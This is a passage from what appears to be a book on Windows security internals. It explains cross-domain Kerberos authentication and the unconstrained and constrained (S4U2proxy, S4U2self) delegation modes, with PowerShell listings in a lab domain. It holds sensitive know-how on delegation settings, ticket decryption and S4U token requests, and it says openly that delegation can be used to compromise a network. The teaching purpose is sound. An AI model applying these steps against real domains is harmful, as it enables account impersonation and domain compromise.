<p class="BoxBodyLast"><samp class="SANS_Futura_Std_Book_11">If everything checks out, the KDC returns a session key to the client, either by encrypting it using the public key or by using a Diffie-Hellman key exchange. As a result, the initial authentication process never uses the shared encryption key derived from the password. (Of course, many functions in Windows rely on the user’s credentials, such as the NT hash, and the PAC in the ticket will contain the NT hash for the client, encrypted in a separate authorization data structure.) You can learn more about the PKINIT implementation in RFC4556.</samp></p>
</aside>
<p class="TX">Next, we’ll look at one more topic related to Kerberos service authentication: how it works across domain trust boundaries.</p>
</section>
<section aria-labelledby="sec7" epub:type="division">
<h3 class="H1" id="sec7"><span id="h1-106"></span><samp class="SANS_Futura_Std_Bold_B_11">Cross-Domain Authentication</samp></h3>
<p class="TNI1">When discussing domain forests in <span class="Xref"><a href="chapter10.xhtml">Chapter 10</a></span> I mentioned the concept of trust relationships, in which a trusted domain accepts credentials belonging to a user configuration stored on a different domain. This section discusses how the Kerberos protocol works across domains in the same forest. Although Kerberos authentication can also occur between forests, and with non-Windows Kerberos implementations, we won’t cover those complex cases here.</p>
<p class="TX"><a href="chapter14.xhtml#fig14-6">Figure 14-6</a> shows the basic operations of inter-domain Kerberos authentication between the example <i>MINERAL</i> and <i>SALES</i> domains.</p>
<span aria-label=" Page 478. " epub:type="pagebreak" id="pg_478" role="doc-pagebreak"></span>
<figure class="IMG"><img alt="" class="img1" height="1040" id="fig14-6" src="../images/Figure14-6.jpg" width="1636"/>
<figcaption><p class="CAP"><samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 14-6: An overview of inter-domain Kerberos authentication</samp></p></figcaption>
</figure>
<p class="TX">The client in the <i>MINERAL</i> domain first requests a service ticket for the <samp class="SANS_TheSansMonoCd_W5Regular_11">HTTP/WEB.SALES</samp> SPN <span aria-label="annotation1" class="CodeAnnotationCode">❶</span>. The TGS can’t satisfy this request, as the SPN isn’t present in its own domain. It checks the global catalog to see if any other domain in the forest has the SPN configured, and finds it in the <i>SALES</i> domain.</p>
<p class="TX">The TGS then checks whether it has a trust relationship with the <i>SALES</i> domain, which it does. When a new trust relationship is established between two domains, a shared Kerberos key is configured between the domain controllers in each domain. This key encrypts a <i>referral ticket</i>, which contains the user’s information and the requested service, and returns it to the client <span aria-label="annotation2" class="CodeAnnotationCode">❷</span>. The client then forwards the referral ticket to the TGS in the <i>SALES</i> domain <span aria-label="annotation3" class="CodeAnnotationCode">❸</span>. As the ticket is encrypted using a shared inter-domain key, the <i>SALES</i> TGS can decrypt it to verify its contents.</p>
<p class="TX">The <i>SALES</i> TGS needs to modify the PAC provided in the referral ticket to add domain-local group memberships for the <i>SALES</i> domain based on the user’s existing groups. The TGS will then re-sign the modified PAC and insert it into the service ticket for use by the local service. It can now issue the service ticket for <samp class="SANS_TheSansMonoCd_W5Regular_11">HTTP/WEB.SALES</samp> and, using the service’s key, return it to the client <span aria-label="annotation4" class="CodeAnnotationCode">❹</span>.</p>
<blockquote>
<p class="NOTE"><span class="NoteHead"><samp class="SANS_Dogma_OT_Bold_B_15">NOTE</samp></span></p>
<p class="NOTE-TXT"><i>In complex inter-domain trust relationships, domains shouldn’t trust any additional SIDs included in the PAC, as an attacker who has compromised the source domain could generate a PAC containing arbitrary SIDs and then compromise the target</i> <span aria-label=" Page 479. " epub:type="pagebreak" id="pg_479" role="doc-pagebreak"></span><i>domain. Windows implements a SID-filtering mechanism to remove SIDs from the PAC that are deemed dangerous, such as any SIDs for the local domain. The full details of SID filtering are, however, outside the scope of this book.</i></p>
</blockquote>
<p class="TX">Finally, the client can use the service ticket to authenticate to the services in the <i>SALES</i> domain <span aria-label="annotation5" class="CodeAnnotationCode">❺</span>. The server receiving the service ticket can use it to build a token based on the modified PAC generated by its domain’s TGS.</p>
<p class="TX">The domains might need to repeat this process of issuing a referral ticket multiple times if they don’t have a direct trust relationship. For example, returning to the example domains from <span class="Xref"><a href="chapter10.xhtml">Chapter 10</a></span>, if a user in the <i>ENGINEERING</i> domain wanted to authenticate to a service in the <i>SALES</i> domain, then the root <i>MINERAL</i> domain would first have to issue a referral ticket. This ticket could then be used to establish a referral ticket for the <i>SALES</i> domain.</p>
<p class="TX">In more complex forests consisting of many domains and trees, this multi-hop referral process might lead to poor performance. To remediate this, Windows provides a mechanism to establish a <i>shortcut trust</i> relationship between any two domains in a forest. The domains can use this trust to establish the referral ticket without needing to follow the normal transitive trust path.</p>
<p class="TX">We’ve covered the basics of Kerberos authentication. Now let’s move on to deeper topics, starting with how an authenticated user can securely forward their credentials to a service.</p>
</section>
<section aria-labelledby="sec8" epub:type="division">
<h3 class="H1" id="sec8"><span id="h1-107"></span><samp class="SANS_Futura_Std_Bold_B_11">Kerberos Delegation</samp></h3>
<p class="TNI1"><i>Delegation</i> enables a service to forward a user’s credentials to another service. This is useful because, when a user connects to a service using Kerberos, they do not provide it with their credentials. Instead, they provide a ticket that has been encrypted using the server’s shared encryption key. The service could try forwarding the ticket on to another service, but as it won’t know the new service’s shared encryption key it won’t be able to encrypt the ticket, so the new service won’t accept it.</p>
<p class="TX">The only way to get an encrypted ticket for a new service might seem to be to send a TGS-REQ message to the TGS using a TGT. However, the original service only has a TGT for its own account, not for the user, and without the user’s TGT a service can’t forward a user’s credentials further than specified. This behavior provides an important security measure; if any authentication a user made to a service could be delegated to another service, it would likely be easy to get full administrator access to the domain.</p>
<p class="TX">That said, forwarding credentials is a useful feature. For example, let’s say you have a corporate network that users can access only from an external network, via a web server. It would be useful if the web server could provide the users’ credentials to access the backend systems, such as a database server. One way of solving this issue would be for the web server to request the user’s plaintext credentials and then use those to authenticate to the <span aria-label=" Page 480. " epub:type="pagebreak" id="pg_480" role="doc-pagebreak"></span>domain, which would then provide the user’s TGT. In practice, though, this is a terrible idea for security.</p>
<p class="TX">Therefore, to make it possible to securely forward credentials, Kerberos implements a defined delegation process. A client can opt in to delegation, allowing a target service to use their identity to request tickets for other network services on their behalf. Windows domains configure delegation on a per-account basis for both users and computers. In the GUI, you’ll see the delegation dialog shown in <a href="chapter14.xhtml#fig14-7">Figure 14-7</a> when inspecting the properties of an account.</p>
<figure class="IMG"><img alt="" class="img7" height="1162" id="fig14-7" src="../images/Figure14-7.jpg" width="1000"/>
<figcaption><p class="CAP"><samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 14-7: The delegation tab for the</samp> <samp class="SANS_Futura_Std_Book_11">GRAPHITE</samp> <samp class="SANS_Futura_Std_Book_Oblique_I_11">computer account</samp></p></figcaption>
</figure>
<p class="TX"><a href="chapter14.xhtml#fig14-7">Figure 14-7</a> shows three main options for delegation. The first option, the default, disables delegation for the account. The second option, called <i>unconstrained delegation</i>, allows the account to delegate to any other service on the network using the authenticating user’s credentials. The third option, known as <i>constrained delegation</i>, allows the user’s credentials to be delegated to a fixed set of services defined by a list of permitted SPNs.</p>
<p class="TX">Let’s dig into the similarities and differences between the two types of delegation and see how they’re implemented. In the following sections, we’ll modify some of the delegation settings in the Active Directory server. This means that you must perform these operations from a user account that has <samp class="SANS_TheSansMonoCd_W5Regular_11">SeEnableDelegationPrivilege</samp> on the domain controller. Typically, only administrators have this privilege, so you should run these examples as a domain administrator.</p>
<section aria-labelledby="sec9" epub:type="division">
<h4 class="H2" id="sec9"><span id="h2-155"></span><span aria-label=" Page 481. " epub:type="pagebreak" id="pg_481" role="doc-pagebreak"></span><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Unconstrained Delegation</samp></h4>
<p class="TNI1">Microsoft introduced unconstrained delegation in Windows 2000 along with the original Windows Kerberos implementation. This Kerberos delegation mechanism requires the client to opt in to providing a copy of their TGT, enabling the service to delegate their credentials. It works only with Kerberos authentication, as the user must have first authenticated to the service using the Kerberos protocol. <a href="chapter14.xhtml#fig14-8">Figure 14-8</a> gives an overview of the unconstrained delegation process.</p>
<figure class="IMG"><img alt="" class="img1" height="879" id="fig14-8" src="../images/Figure14-8.jpg" width="1631"/>
<figcaption><p class="CAP"><samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 14-8: The unconstrained delegation process</samp></p></figcaption>
</figure>
<p class="TX">This figure shows a client delegating its credentials through the HTTP service on the server <i>WEB</i> to the database service on the server <i>DB</i>. The client first makes a ticket request to the TGS with its TGT for a normal ticket, using the <samp class="SANS_TheSansMonoCd_W5Regular_11">HTTP/WEB.MINERAL</samp> SPN <span aria-label="annotation1" class="CodeAnnotationCode">❶</span>. If the destination service can use delegation, the returned ticket should have the <samp class="SANS_TheSansMonoCd_W5Regular_11">OkAsDelegate</samp> flag set, which indicates to the client that it can delegate if it wants to.</p>
<p class="TX">The client then makes a second request for a new TGT to send to the HTTP service. The client indicates its intention by specifying the target principal name as the <i>krbtgt</i> user and setting the <samp class="SANS_TheSansMonoCd_W5Regular_11">Forwardable</samp> and <samp class="SANS_TheSansMonoCd_W5Regular_11">Forwarded</samp> flags on the TGS-REQ <span aria-label="annotation2" class="CodeAnnotationCode">❷</span>. If delegation is allowed, the TGS will return this new TGT to the client.</p>
<p class="TX">The client can then package up the original service ticket and the TGT into the AP-REQ message for the server and send it over HTTP <span aria-label="annotation3" class="CodeAnnotationCode">❸</span>. The AP-REQ must also contain the session key information for the encrypted TGT so that the target service can decrypt it. The Windows APIs enable mutual authentication when delegating credentials, so the server returns an AP-REP to the client <span aria-label="annotation4" class="CodeAnnotationCode">❹</span>.</p>
<p class="TX"><span aria-label=" Page 482. " epub:type="pagebreak" id="pg_482" role="doc-pagebreak"></span>Once the HTTP service has received the AP-REQ, it can get the LSA to give it a token for that user. The LSA will also save the TGT and session key information in the new logon session. When the HTTP service wants to authenticate to the database service, it can impersonate the user’s token and start the Kerberos authentication process. This means the user’s TGT will be used to request a ticket for <samp class="SANS_TheSansMonoCd_W5Regular_11">SQL/DB.MINERAL</samp> from the TGS <span aria-label="annotation5" class="CodeAnnotationCode">❺</span>. Assuming the service meets all the policy requirements, the TGS will return the service ticket <span aria-label="annotation6" class="CodeAnnotationCode">❻</span>, which the LSA will return as a new AP-REQ to pass to the database service <span aria-label="annotation7" class="CodeAnnotationCode">❼</span>, completing the delegation.</p>
<p class="TX">As the delegated TGT is sent via the AP-REQ message, we should be able to inspect the delegation process occurring during a local authentication in PowerShell. The authenticating user needs a registered SPN. We’ll use the <i>alice</i> user, for whom we added an SPN in <span class="Xref">“Decrypting the AP-REQ Message” on page 469.</span> First we must enable unconstrained delegation for this user. You can either use the GUI to enable the delegation, or run the following <samp class="SANS_TheSansMonoCd_W5Regular_11">Set-ADAccountControl</samp> PowerShell command as a domain administrator:</p>
<pre><code>PS&gt; <b>Set-ADAccountControl -Identity alice -TrustedForDelegation $true</b>
</code></pre>
<p class="TX">You can verify that delegation has been enabled using the <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-ADUser</samp> or <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-ADComputer</samp> command (depending on the account type), as shown in <a href="chapter14.xhtml#Lis14-17">Listing 14-17</a>.</p>
<span id="Lis14-17"></span><pre><code>PS&gt; <b>Get-ADUser -Identity alice -Properties TrustedForDelegation |</b>
<b>Select-Object TrustedForDelegation</b>
TrustedForDelegation
--------------------
                True
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 14-17: Querying the user’s TrustedForDelegation property</span></p>
<p class="TX">Now let’s create a client authentication context and request an AP-REQ message with a delegate ticket (<a href="chapter14.xhtml#Lis14-18">Listing 14-18</a>).</p>
<span id="Lis14-18"></span><pre><code>PS&gt; <b>$credout = New-LsaCredentialHandle -Package "Kerberos" -UseFlag Outbound</b>
<span aria-label="annotation1" class="CodeAnnotationHang1">❶</span> PS&gt; <b>$client = New-LsaClientContext -CredHandle $credout -Target </b>
<b>"HTTP/graphite"-RequestAttribute MutualAuth, Delegate</b>
PS&gt; <b>$key = Get-KerberosKey -Password "AlicePassw0rd" -KeyType ARCFOUR_HMAC_MD5</b>
<b>-NameType SRV_INST -Principal "HTTP/graphite@mineral.local"</b>
PS&gt; <b>Unprotect-LsaAuthToken -Token $client.Token -Key $key | </b>
<b>Format-LsaAuthToken</b>
&lt;KerberosV5 KRB_AP_REQ&gt;
Options         : MutualAuthRequired
&lt;Ticket&gt;
Ticket Version  : 5
Server Name     : SRV_INST - HTTP/graphite
Realm           : MINERAL.LOCAL
<span aria-label="annotation2" class="CodeAnnotationHang1">❷</span> Flags           : Forwardable, Renewable, PreAuthent, OkAsDelegate, EncPARep
<var>--snip--</var>
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 14-18: Requesting an AP-REQ and displaying the delegate ticket</span></p>
<p class="TX"><span aria-label=" Page 483. " epub:type="pagebreak" id="pg_483" role="doc-pagebreak"></span>We must specify both the <samp class="SANS_TheSansMonoCd_W5Regular_11">MutualAuth</samp> and <samp class="SANS_TheSansMonoCd_W5Regular_11">Delegate</samp> flags <span aria-label="annotation1" class="CodeAnnotationCode">❶</span> for the LSA to request the delegated TGT. Note that the <samp class="SANS_TheSansMonoCd_W5Regular_11">OkAsDelegate</samp> flag is set in the resulting ticket <span aria-label="annotation2" class="CodeAnnotationCode">❷</span>. This flag exists regardless of whether the client requested delegation, as the LSA combines it with the delegate request attribute to determine whether to request the TGT.</p>
<p class="TX">The authenticator stores the new TGT as part of the GSSAPI checksum, as shown in <a href="chapter14.xhtml#Lis14-19">Listing 14-19</a>.</p>
<span id="Lis14-19"></span><pre><code>&lt;Authenticator&gt;
Client Name     : PRINCIPAL - alice
Client Realm    : MINERAL.LOCAL
Client Time     : 5/15 1:51:00 PM
Checksum        : GSSAPI
Channel Binding : 00000000000000000000000000000000
<span aria-label="annotation1" class="CodeAnnotationHang1">❶</span> Context Flags   : Delegate, Mutual
Delegate Opt ID : 1
&lt;KerberosV5 KRB_CRED&gt;
<span aria-label="annotation2" class="CodeAnnotationHang1">❷</span> &lt;Ticket 0&gt;
Ticket Version  : 5
<span aria-label="annotation3" class="CodeAnnotationHang1">❸</span> Server Name     : SRV_INST - krbtgt/MINERAL.LOCAL
Realm           : MINERAL.LOCAL
Encryption Type : AES256_CTS_HMAC_SHA1_96
Key Version     : 2
Cipher Text     :
00000000: 49 FA B2 17 34 F9 0F D6 0C DE A3 67 54 9E 74 B7
00000010: 4E 1B 18 DC 91 40 F1 91 DC 42 37 64 CC 39 56 78
<var>--snip--</var>
000005D0: E5 D5 99 FD 15 2B
<span aria-label="annotation4" class="CodeAnnotationHang1">❹</span> &lt;Encrypted Part&gt;
Encryption Type : AES256_CTS_HMAC_SHA1_96
Cipher Text     :
00000000: 3B 25 F6 CA 18 B4 E6 D4 C0 77 07 66 73 0E 67 9C
<var>--snip--</var>
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 14-19: The AP-REQ authenticator with the delegated TGT</span></p>
<p class="TX">If you compare this authenticator with the one shown in <a href="chapter14.xhtml#Lis14-15">Listing 14-15</a>, the first difference you should notice is that both the <samp class="SANS_TheSansMonoCd_W5Regular_11">Delegate</samp> and <samp class="SANS_TheSansMonoCd_W5Regular_11">Mutual</samp> context flags are set <span aria-label="annotation1" class="CodeAnnotationCode">❶</span>.</p>
<p class="TX">The <samp class="SANS_TheSansMonoCd_W5Regular_11">Delegate</samp> flag indicates that a <i>Kerberos Credential (KRB-CRED)</i> structure is packed into the <samp class="SANS_TheSansMonoCd_W5Regular_11">Checksum</samp> field. Within the KRB-CRED, we find the TGT ticket <span aria-label="annotation2" class="CodeAnnotationCode">❷</span>. We can tell it’s a TGT because it’s for the <i>krbtgt</i> principal <span aria-label="annotation3" class="CodeAnnotationCode">❸</span>. The KRB-CRED structure also contains an extra encrypted part to hold the session keys that go with the TGT <span aria-label="annotation4" class="CodeAnnotationCode">❹</span>.</p>
<p class="TX">If we can complete the authentication, we can receive an impersonation token. The LSA now has enough information for the service to request any service ticket on behalf of the user that provided the delegated TGT, as demonstrated in <a href="chapter14.xhtml#Lis14-20">Listing 14-20</a>.</p>
<span id="Lis14-20"></span><pre><code>PS&gt; <b>$credin = New-LsaCredentialHandle -Package "Kerberos" -UseFlag Inbound</b>
PS&gt; <b>$server = New-LsaServerContext -CredHandle $credin</b>
PS&gt; <b>Update-LsaServerContext -Server $server -Client $client</b>
<span aria-label=" Page 484. " epub:type="pagebreak" id="pg_484" role="doc-pagebreak"></span>PS&gt;<b> Use-NtObject($token = Get-LsaAccessToken $server) {</b>
    <b>Format-NtToken $token -Information</b>
<b>}</b>
TOKEN INFORMATION
-----------------
Type       : Impersonation
Imp Level  : Delegation
<var>--snip--</var>
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 14-20: Completing the delegation authentication process</span></p>
<p class="TX">Notice that the <samp class="SANS_TheSansMonoCd_W5Regular_11">Token</samp> object in <a href="chapter14.xhtml#Lis14-20">Listing 14-20</a> has the Delegation impersonation level. Certain kernel APIs enforce this impersonation level, including <samp class="SANS_TheSansMonoCd_W5Regular_11">SeCreateClientSecurity</samp>, which captures the calling client’s token for later use by the <samp class="SANS_TheSansMonoCd_W5Regular_11">SeImpersonateClient</samp> kernel API. The <samp class="SANS_TheSansMonoCd_W5Regular_11">SeCreateClientSecurity</samp> API takes a Boolean <samp class="SANS_TheSansMonoCd_W5Regular_11">ServerIsRemote</samp> parameter. If the parameter is <samp class="SANS_TheSansMonoCd_W5Regular_11">True</samp>, the API fails to capture the token if the impersonation level is not Delegation. However, well-known callers such as the SMB do not set the parameter to <samp class="SANS_TheSansMonoCd_W5Regular_11">True</samp>. Therefore, the Delegation impersonation level is the de facto equivalent to the Impersonation level for both local and remote access, assuming there are credentials available in the logon session.</p>
<blockquote>
<p class="NOTE"><span class="NoteHead"><samp class="SANS_Dogma_OT_Bold_B_15">NOTE</samp></span></p>
<p class="NOTE-TXT"><i>In Windows 10 and later, you can enable a feature called Credential Guard that uses virtualization technology to protect the user’s credentials, including the Kerberos TGT session key stored by the LSA, from being disclosed to a privileged user reading the memory of the LSASS process. As unconstrained delegation would introduce a mechanism to disclose the TGT session key for a user, it is no longer possible to use it if Credential Guard is enabled.</i></p>
</blockquote>
</section>
<section aria-labelledby="sec10" epub:type="division">
<h4 class="H2" id="sec10"><span id="h2-156"></span><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Constrained Delegation</samp></h4>
<p class="TNI1">Microsoft introduced constrained delegation, also called <i>Service for User (S4U)</i>, in Windows 2003. Its purpose was to fix a security weakness in unconstrained delegation: namely, once a user had delegated credentials to a service, it could impersonate them to any other service in the same domain, even if the services were completely unrelated to the purpose of the original service.</p>
<p class="TX">This made any service with unconstrained delegation a good target for attack. If you compromised the service and could convince a privileged user to delegate their credentials to it, you had a good chance of compromising the entire network. Technically a user had to opt in to delegating their credentials, but common client applications such as Internet Explorer did so by default, and always passed the delegate request attribute when setting up the client authentication context.</p>
<p class="TX">Microsoft resolved the security weakness by allowing an administrator to specify an explicit list of SPNs that the service could use for delegation. For example, the administrator could limit the HTTP service discussed earlier to delegating only to the database service and nothing else.</p>
<p class="TX"><span aria-label=" Page 485. " epub:type="pagebreak" id="pg_485" role="doc-pagebreak"></span>Constrained delegation can work in three modes:</p>
<ul class="ul">
<li class="ListBullet">Kerberos-only delegation</li>
<li class="ListBullet">Protocol transition delegation</li>
<li class="ListBullet">Resource-based delegation</li>
</ul>
<p class="TX">We’ll cover each mode in turn in the following sections.</p>
<section aria-labelledby="sec11" epub:type="division">
<h5 class="H3" id="sec11"><span id="h3-41"></span><samp class="SANS_Futura_Std_Bold_Condensed_B_11">Kerberos-Only Delegation</samp></h5>
<p class="TNI1">Also called <i>Service for User to Proxy (S4U2proxy)</i> in the official documentation, the Kerberos-only delegation mode works in much the same way as unconstrained delegation. It requires the user to authenticate to the intermediate service using Kerberos, as described in <a href="chapter14.xhtml#fig14-9">Figure 14-9</a>.</p>
<figure class="IMG"><img alt="" class="img1" height="879" id="fig14-9" src="../images/Figure14-9.jpg" width="1625"/>
<figcaption><p class="CAP"><samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 14-9: An overview of constrained Kerberos-only delegation</samp></p></figcaption>
</figure>
<p class="TX">While this looks very similar to <a href="chapter14.xhtml#fig14-8">Figure 14-8</a>, there are subtle differences. First, the original user requests a normal service ticket for the HTTP service <span aria-label="annotation1" class="CodeAnnotationCode">❶</span>, not an additional TGT. The user can package this service ticket into an AP-REQ message and send it to the HTTP service <span aria-label="annotation2" class="CodeAnnotationCode">❷</span>. The HTTP service then wants to delegate the user’s authentication to the database service, so it requests a service ticket from the TGS, including its own TGT. It also attaches the user’s service ticket for its own service to the TGS-REQ message <span aria-label="annotation3" class="CodeAnnotationCode">❸</span>.</p>
<p class="TX">The TGS inspects the request. If the user’s service ticket has the <samp class="SANS_TheSansMonoCd_W5Regular_11">Forwardable</samp> flag set and the database service is in the list of allowed services for the account making the ticket request, the TGS will use the user’s service ticket to the HTTP service to generate a service ticket for the database <span aria-label=" Page 486. " epub:type="pagebreak" id="pg_486" role="doc-pagebreak"></span>service <span aria-label="annotation4" class="CodeAnnotationCode">❹</span>. The service can package this ticket and associated information into an AP-REQ message as normal and send it to the database service <span aria-label="annotation5" class="CodeAnnotationCode">❺</span>.</p>
<p class="TX">While it might seem as though the user can’t control the delegation of their credentials, they could block the delegation by simply choosing not to request a <samp class="SANS_TheSansMonoCd_W5Regular_11">Forwardable</samp> service ticket. We’ll come back to how to unset the <samp class="SANS_TheSansMonoCd_W5Regular_11">Forwardable</samp> flag later.</p>
<p class="TX">The list of SPNs for services to which an account can delegate is stored in the user’s or computer’s account entry in Active Directory, in the <samp class="SANS_TheSansMonoCd_W5Regular_11">msDS-AllowedToDelegateTo</samp> attribute. You can set this attribute using <samp class="SANS_TheSansMonoCd_W5Regular_11">Set-ADUser</samp> or <samp class="SANS_TheSansMonoCd_W5Regular_11">Set-ADComputer</samp> in PowerShell, as shown in <a href="chapter14.xhtml#Lis14-21">Listing 14-21</a>.</p>
<span id="Lis14-21"></span><pre><code>PS&gt; <b>$spns = @{'msDS-AllowedToDelegateTo'=@('CIFS/graphite')}</b>
PS&gt; <b>Set-ADUser -Identity alice -Add $spns</b>
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 14-21: Adding a new msDS-AllowedToDelegateTo entry for the</span> <samp class="SANS_Futura_Std_Book_11">alice</samp> <span class="Futura_Std_Book_Oblique_I_11">account</span></p>
<p class="TX">To query the list of SPNs, use <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-ADUser</samp> or <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-ADComputer</samp>, as shown in <a href="chapter14.xhtml#Lis14-22">Listing 14-22</a>.</p>
<span id="Lis14-22"></span><pre><code>PS&gt; <b>Get-ADUser -Identity alice -Properties 'msDS-AllowedToDelegateTo' |</b>
<b>Select-Object -Property 'msDS-AllowedToDelegateTo'</b>
msDS-AllowedToDelegateTo
------------------------
{CIFS/graphite}
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 14-22: Querying the msDS-AllowedToDelegateTo attribute</span></p>
<p class="TX">In this example, we confirm we can delegate to the <samp class="SANS_TheSansMonoCd_W5Regular_11">CIFS/graphite</samp> service.</p>
</section>
<section aria-labelledby="sec12" epub:type="division">
<h5 class="H3" id="sec12"><span id="h3-42"></span><samp class="SANS_Futura_Std_Bold_Condensed_B_11">Protocol Transition Delegation</samp></h5>
<p class="TNI1">Requiring end-to-end Kerberos authentication to the domain isn’t always feasible. For example, what if the user accessing the HTTP service is on a public network and cannot directly connect to the KDC to get a service ticket? This is where the second type of constrained delegation—protocol transition delegation, referred to as <i>Service for User to Self (S4U2self)</i> in the documentation—might be useful. It performs an <i>authentication protocol transition</i>, meaning that the frontend HTTP service can authenticate using its own authentication mechanism, then use that information to construct a service ticket for the database service with the user’s domain credentials, without requiring the user to know about Kerberos.</p>
<p class="TX"><a href="chapter14.xhtml#fig14-10">Figure 14-10</a> shows the steps involved in constrained delegation using an authentication protocol transition.</p>
<span aria-label=" Page 487. " epub:type="pagebreak" id="pg_487" role="doc-pagebreak"></span>
<figure class="IMG"><img alt="" class="img1" height="880" id="fig14-10" src="../images/Figure14-10.jpg" width="1625"/>
<figcaption><p class="CAP"><samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 14-10: An overview of constrained delegation with an authentication protocol transition</samp></p></figcaption>
</figure>
<p class="TX">The user first makes a request to the HTTP service and provides authentication credentials <span aria-label="annotation1" class="CodeAnnotationCode">❶</span>. The credentials don’t have to be related to the Kerberos credentials we want to use, and the authentication protocol used can be anything, such as basic HTTP authentication. The HTTP service maps the authenticated user to a domain account, then makes a request to the TGS for a service ticket for itself with that domain account’s information <span aria-label="annotation2" class="CodeAnnotationCode">❷</span>.</p>
<p class="TX">The TGS gathers all of the target user’s details (like their group memberships), puts them into the PAC, and sends the service ticket back to the service. Because the ticket is for the service itself, the LSA can decrypt the ticket, extract the PAC, and generate a <samp class="SANS_TheSansMonoCd_W5Regular_11">Token</samp> object.</p>
<p class="TX">This process might seem dangerous. After all, it lets you request a service ticket out of thin air without requiring any authentication of the user. Believe it or not, this is really how S4U2self works; however, bear in mind that the token generated is only useful for the local system. The LSA can already synthesize a token containing any groups it likes and use it locally, so this doesn’t change the security properties of the system.</p>
<p class="TX">Unlike with a synthesized local token, though, the LSA has a copy of the S4U2self service ticket. If the service’s account is configured for delegation, it can use S4U2proxy with the S4U2self service ticket to request a service ticket for a permitted service <span aria-label="annotation3" class="CodeAnnotationCode">❸</span>. It can then package this new service ticket in an AP-REQ and use it to authenticate to the database service <span aria-label="annotation4" class="CodeAnnotationCode">❹</span>.</p>
<p class="TX">You can configure S4U2self to be permitted to transition to S4U2proxy by setting the list of permitted SPNs in <samp class="SANS_TheSansMonoCd_W5Regular_11">msDS-AllowedToDelegateTo</samp> and setting the user account control flag <samp class="SANS_TheSansMonoCd_W5Regular_11">TrustedToAuthForDelegation</samp> to <samp class="SANS_TheSansMonoCd_W5Regular_11">True</samp>. You <span aria-label=" Page 488. " epub:type="pagebreak" id="pg_488" role="doc-pagebreak"></span>saw how to modify the permitted SPNs in <a href="chapter14.xhtml#Lis14-21">Listing 14-21</a>. You can set the <samp class="SANS_TheSansMonoCd_W5Regular_11">TrustedToAuthForDelegation</samp> flag using the following command:</p>
<pre><code>PS&gt; <b>Set-ADAccountControl -Identity alice -TrustedToAuthForDelegation $true</b>
</code></pre>
<p class="TX">To query the status of the flag, use <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-ADUser</samp> or <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-ADComputer</samp>, as shown in <a href="chapter14.xhtml#Lis14-23">Listing 14-23</a>.</p>
<span id="Lis14-23"></span><pre><code>PS&gt; <b>Get-ADUser -Identity alice -Properties TrustedToAuthForDelegation |</b>
<b>Select-Object -Property TrustedToAuthForDelegation</b>
TrustedToAuthForDelegation
--------------------------
                      True
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 14-23: Querying the TrustedToAuthForDelegation flag</span></p>
<p class="TX">You’ll note we do not check whether we can request the initial S4U2self ticket. As mentioned earlier, this is only an issue for the local system’s security. Without S4U2proxy configured, the computer can’t use the credentials in a network request. In fact, any user on Windows can request an S4U token using <samp class="SANS_TheSansMonoCd_W5Regular_11">LsaLogonUser</samp> or via the <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-NtToken</samp> command, even if not connected to an enterprise network.</p>
<p class="TX"><a href="chapter14.xhtml#Lis14-24">Listing 14-24</a> shows that we’re currently running as the <i>alice</i> user. Let’s try requesting a token for another user.</p>
<span id="Lis14-24"></span><pre><code>PS&gt; <b>Show-NtTokenEffective</b>
MINERAL\alice

<span aria-label="annotation1" class="CodeAnnotationHang1">❶</span> PS&gt; <b>$token = Get-NtToken -S4U -User bob -Domain MINERAL</b>
PS&gt; <b>Format-NtToken $token</b>
<span aria-label="annotation2" class="CodeAnnotationHang1">❷</span> MINERAL\bob

PS&gt; <b>Format-NtToken $token -Information</b>
TOKEN INFORMATION
-----------------
Type       : Impersonation
<span aria-label="annotation3" class="CodeAnnotationHang1">❸</span> Imp Level  : Identification
<var>--snip--</var>
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 14-24: Requesting an S4U2self token as a normal user</span></p>
<p class="TX">Here, we use <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-NtToken</samp> with the <samp class="SANS_TheSansMonoCd_W5Regular_11">S4U</samp> parameter to request a token for the <i>bob</i> user <span aria-label="annotation1" class="CodeAnnotationCode">❶</span>. Notice we don’t need to specify a password. We can confirm that the token is really for <i>bob</i> by formatting it <span aria-label="annotation2" class="CodeAnnotationCode">❷</span>.</p>
<p class="TX">This design would have a massive local security hole if the LSA didn’t restrict the token to Identification level, which prevents a normal user from being able to use the token to access secured resources <span aria-label="annotation3" class="CodeAnnotationCode">❸</span>. The only way to get an Impersonation-level token is to have <samp class="SANS_TheSansMonoCd_W5Regular_11">SeTcbPrivilege</samp> enabled, which only the local <i>SYSTEM</i> account has by default. Thus, it’s typical to configure <samp class="SANS_TheSansMonoCd_W5Regular_11">TrustedToAuthForDelegation</samp> on the computer account used by the <i>SYSTEM</i> account, so it can impersonate the S4U2self token at the Impersonation level, then get the LSA to query for the S4U2proxy ticket.</p>
</section>
<section aria-labelledby="sec13" epub:type="division">
<h5 class="H3" id="sec13"><span id="h3-43"></span><span aria-label=" Page 489. " epub:type="pagebreak" id="pg_489" role="doc-pagebreak"></span><samp class="SANS_Futura_Std_Bold_Condensed_B_11">Resource-Based Delegation</samp></h5>
